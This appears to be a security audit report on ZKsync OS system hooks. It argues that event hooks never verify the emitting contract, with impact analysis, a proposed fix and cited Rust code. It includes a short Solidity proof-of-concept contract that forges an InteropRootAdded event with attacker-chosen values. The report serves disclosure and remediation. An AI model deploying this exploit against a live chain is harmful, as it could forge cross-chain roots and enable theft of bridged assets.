### Title
Missing Caller Verification in `interop_root_reporter_event_hook` Allows Any Contract to Inject Arbitrary Interop Roots - (File: `system_hooks/src/event_hooks/interop_root_reporter.rs`)

---

### Summary

The `interop_root_reporter_event_hook` and `system_context_event_hook` event hooks process privileged system events without verifying which contract emitted them. Because the `SystemEventHook` function signature structurally omits the emitter address, any unprivileged contract can emit the matching event topic and trigger critical system state mutations — injecting arbitrary interop roots or overwriting the settlement-layer chain ID.

---

### Finding Description

**Root cause — structural omission of emitter address in `SystemEventHook`:**

The `SystemEventHook` wrapper type is defined in `zk_ee/src/common_structs/system_hooks.rs`:

```rust
pub struct SystemEventHook<S: SystemTypes>(
    for<'a> fn(
        &arrayvec::ArrayVec<..., MAX_EVENT_TOPICS>,
        &[u8],   // data
        u8,      // caller_ee (EE type, NOT address)
        &mut System<S>,
        &mut S::Resources,
    ) -> Result<(), SystemError>,
);
``` [1](#0-0) 

The emitter address is **never passed** to any event hook. The third parameter is `caller_ee: u8` — the execution environment type — not the contract address. This makes it structurally impossible for any event hook to check who emitted the event.

**Vulnerable hook 1 — `interop_root_reporter_event_hook`:**

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    _caller_ee: u8,          // ← address not available
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError> {
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
    // ... parses chain_id, block_or_batch_number, root from attacker-controlled topics/data
    system.io.add_interop_root(ExecutionEnvironmentType::NoEE, resources, InteropRoot { root, block_or_batch_number, chain_id })?;
    Ok(())
}
``` [2](#0-1) 

The only guard is a topic-signature match. Any contract that emits a LOG with `topics[0] == INTEROP_ROOT_ADDED_EVENT_SIG` and correctly-sized `data` (96 bytes, `len == 1`) will cause the system to call `add_interop_root` with fully attacker-controlled `chain_id`, `block_or_batch_number`, and `root`.

**Vulnerable hook 2 — `system_context_event_hook` / `new_sl_chain_id_event_hook`:**

```rust
fn new_sl_chain_id_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    _caller_ee: u8,          // ← address not available
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError> {
    // ...
    let new_sl_chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    system.io.update_settlement_layer_chain_id(ExecutionEnvironmentType::NoEE, resources, new_sl_chain_id)?;
    Ok(())
}
``` [3](#0-2) 

Any contract emitting `SettlementLayerChainIdUpdated(uint256)` with two topics can overwrite the settlement-layer chain ID stored in system state.

**Contrast with call hooks that do check the caller:**

Every call hook (`l1_messenger_hook`, `mint_base_token_hook`, `set_bytecode_on_address_hook`, `contract_deployer_temp_hook`) explicitly checks `caller != AUTHORIZED_ADDRESS` and returns an empty-account response for unauthorized callers. [4](#0-3) [5](#0-4) 

Event hooks have no equivalent guard because the emitter address is architecturally absent from the `SystemEventHook` signature.

---

### Impact Explanation

**Interop root injection:** An attacker injects a fake `InteropRoot { root, chain_id, block_or_batch_number }` into the system's interop-root store. If interop roots are used downstream to verify cross-chain message inclusion proofs, a fabricated root can make fraudulent cross-chain messages appear valid, enabling theft of bridged assets or replay of messages.

**Settlement-layer chain ID overwrite:** An attacker sets the settlement-layer chain ID to an arbitrary value. This corrupts a system-level parameter used in cross-chain and settlement logic, potentially causing all subsequent settlement operations to reference the wrong chain, breaking finality guarantees or enabling double-spend scenarios.

Both impacts are direct, irreversible state mutations triggered by a single unprivileged transaction.

---

### Likelihood Explanation

The attack requires only:
1. Deploying a contract (standard EVM `CREATE`).
2. Calling it once to emit a LOG with the matching 32-byte topic signature and correctly-sized data.

No privileged role, leaked key, or oracle manipulation is needed. The event-topic signatures are public constants in the source code. Any on-chain actor can execute this in a single transaction.

---

### Recommendation

Add the emitter address to the `SystemEventHook` function signature in `zk_ee/src/common_structs/system_hooks.rs`:

```rust
pub struct SystemEventHook<S: SystemTypes>(
    for<'a> fn(
        &arrayvec::ArrayVec<..., MAX_EVENT_TOPICS>,
        &[u8],
        u8,
+       &<S::IOTypes as SystemIOTypesConfig>::Address,  // emitter address
        &mut System<S>,
        &mut S::Resources,
    ) -> Result<(), SystemError>,
);
```

Then, in each sensitive event hook, verify the emitter before acting:

```rust
// interop_root_reporter_event_hook
if emitter != INTEROP_ROOT_REPORTER_ADDRESS {
    return Ok(());
}

// system_context_event_hook
if emitter != SYSTEM_CONTEXT_ADDRESS {
    return Ok(());
}
```

This mirrors the pattern already used correctly in all call hooks.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeInteropRootEmitter {
    // InteropRootAdded(uint256,uint256,bytes32[])
    bytes32 constant SIG = 0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0;

    function inject(uint256 chainId, uint256 blockNum, bytes32 fakeRoot) external {
        // data: offset=32, len=1, root=fakeRoot  (96 bytes total)
        bytes memory data = abi.encode(uint256(32), uint256(1), fakeRoot);
        assembly {
            // log3(data, SIG, chainId, blockNum)
            log3(add(data, 32), 96, SIG, chainId, blockNum)
        }
    }
}
```

1. Deploy `FakeInteropRootEmitter` on ZKsync OS.
2. Call `inject(targetChainId, targetBlock, fabricatedRoot)`.
3. The `interop_root_reporter_event_hook` fires, passes all format checks, and calls `system.io.add_interop_root()` with the attacker-supplied values.
4. The fabricated root is now part of the canonical interop-root store, indistinguishable from a legitimately reported root.

### Citations

**File:** zk_ee/src/common_structs/system_hooks.rs (L43-60)
```rust
/// System event hooks process the given event.
/// These are just used to report information from
/// system contracts to ZKsync OS.
///
/// The inputs are:
/// - topics
/// - data
/// - caller ee(logic may depend on it some cases)
/// - system
pub struct SystemEventHook<S: SystemTypes>(
    for<'a> fn(
        &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
        &[u8],
        u8,
        &mut System<S>,
        &mut S::Resources,
    ) -> Result<(), SystemError>,
);
```

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L19-81)
```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    // First, ensure we're capturing the InteropRootAdded event
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
    // Internal error if the data supplied doesn't match the expected value
    if data.len() != 96 {
        return Err(internal_error!("Interop root reporter event hook received bad data").into());
    }

    // Parse data
    let offset: u32 = match U256::from_be_slice(&data[..32]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad offset").into(),
            );
        }
    };
    // This event is part of the system, but we check it anyways
    if offset != 32 {
        return Err(internal_error!("Interop root reporter event hook received bad offset").into());
    }

    let len: u32 = match U256::from_be_slice(&data[32..64]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad length").into(),
            );
        }
    };
    // It should have exactly one side
    if len != 1 {
        return Err(internal_error!("Interop root reporter event hook received bad length").into());
    }
    // Validate topics length
    if topics.len() != 3 {
        return Err(internal_error!("Interop root reporter event hook received bad topics").into());
    }

    let root = Bytes32::from_array(data[64..96].try_into().unwrap());
    let chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    let block_or_batch_number = U256::from_be_bytes(topics[2].as_u8_array());
    system.io.add_interop_root(
        ExecutionEnvironmentType::NoEE,
        resources,
        InteropRoot {
            root,
            block_or_batch_number,
            chain_id,
        },
    )?;

    Ok(())
```

**File:** system_hooks/src/event_hooks/system_context.rs (L38-67)
```rust
fn new_sl_chain_id_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    // Internal error if the data supplied isn't empty
    if !data.is_empty() {
        return Err(
            internal_error!("New SL chain id reporter event hook received bad data").into(),
        );
    }
    // Same if there's a mismatch in expected topics
    if topics.len() != 2 {
        return Err(
            internal_error!("New SL chain id reporter event hook received bad topics").into(),
        );
    }

    let new_sl_chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    system.io.update_settlement_layer_chain_id(
        ExecutionEnvironmentType::NoEE,
        resources,
        new_sl_chain_id,
    )?;

    Ok(())
```

**File:** system_hooks/src/call_hooks/mint_base_token.rs (L39-46)
```rust
    // Only allow L2 base token contract to mint tokens
    if caller != L2_BASE_TOKEN_ADDRESS {
        // Pretend to be an empty account
        return Ok((
            make_return_state_from_returndata_region(available_resources, &[]),
            return_memory,
        ));
    }
```

**File:** system_hooks/src/call_hooks/l1_messenger.rs (L44-55)
```rust
    // Can be used only by L1 messenger system contract
    if caller != L1_MESSENGER_ADDRESS {
        system_log!(
            system,
            "L1 messenger hook: invalid caller (caller={caller:?})\n"
        );
        // Pretend to be an empty account
        return Ok((
            make_return_state_from_returndata_region(available_resources, &[]),
            return_memory,
        ));
    }
```
